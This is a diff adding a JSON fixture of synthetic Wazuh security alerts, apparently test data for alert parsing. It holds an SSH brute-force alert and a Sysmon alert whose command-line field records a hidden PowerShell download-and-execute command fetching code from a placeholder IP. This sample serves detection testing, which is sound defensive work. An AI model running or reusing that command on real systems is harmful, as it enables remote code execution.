@@ -1,0 +1,49 @@
+{
+  "_synthetic": "Synthetic Wazuh alerts.json documents; not real data.",
+  "events": [
+    {
+      "timestamp": "2024-03-05T10:15:30.123+0000",
+      "rule": {
+        "level": 10,
+        "description": "sshd: brute force trying to get access to the system. Non existent user.",
+        "id": "5712",
+        "mitre": {"id": ["T1110"], "tactic": ["Credential Access"], "technique": ["Brute Force"]},
+        "frequency": 8,
+        "firedtimes": 3,
+        "groups": ["syslog", "sshd", "authentication_failures"],
+        "pci_dss": ["10.2.4", "10.2.5"]
+      },
+      "agent": {"id": "001", "name": "web-01", "ip": "10.0.0.5"},
+      "manager": {"name": "wazuh-manager"},
+      "id": "1709633730.1234567",
+      "full_log": "Mar  5 10:15:30 web-01 sshd[1234]: Invalid user oracle from 203.0.113.5 port 52814",
+      "decoder": {"parent": "sshd", "name": "sshd"},
+      "data": {"srcip": "203.0.113.5", "srcport": "52814", "srcuser": "oracle"},
+      "location": "/var/log/auth.log"
+    },
+    {
+      "timestamp": "2024-03-05T10:16:00.000+0000",
+      "rule": {
+        "level": 12,
+        "description": "Sysmon - Suspicious process: PowerShell spawned by Office",
+        "id": "92052",
+        "mitre": {"id": ["T1059.001"], "tactic": ["Execution"]},
+        "groups": ["windows", "sysmon", "sysmon_event1"]
+      },
+      "agent": {"id": "014", "name": "FIN-WS-22", "ip": "10.0.1.22"},
+      "id": "1709633760.2233445",
+      "data": {
+        "win": {
+          "system": {"eventID": "1", "computer": "FIN-WS-22.corp.example.com"},
+          "eventdata": {
+            "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+            "parentImage": "C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\EXCEL.EXE",
+            "commandLine": "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')",
+            "targetUserName": "mjones",
+            "hashes": "SHA1=3F2A9C4E1B7D8A603F2A9C4E1B7D8A603F2A9C4E,MD5=9E107D9D372BB6826BD81D3542A419D6,SHA256=D7A8FBB307D7809469CA9ABCB0082E4F8D5651E46D3CDB762D02D0BF37C9E592,IMPHASH=00000000000000000000000000000000"
+          }
+        }
+      }
+    }
+  ]
+}
